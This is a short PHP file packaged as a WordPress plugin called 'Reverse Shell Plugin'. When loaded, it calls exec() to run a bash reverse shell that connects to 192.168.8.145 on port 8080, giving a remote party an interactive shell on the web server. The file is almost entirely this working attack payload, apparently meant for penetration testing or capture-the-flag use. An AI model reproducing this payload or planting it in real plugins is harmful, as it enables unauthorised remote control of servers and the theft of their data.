<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Kasun Perera
* Author URI: http://5h4d0w.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.8.145/8080 0>&1'");
?>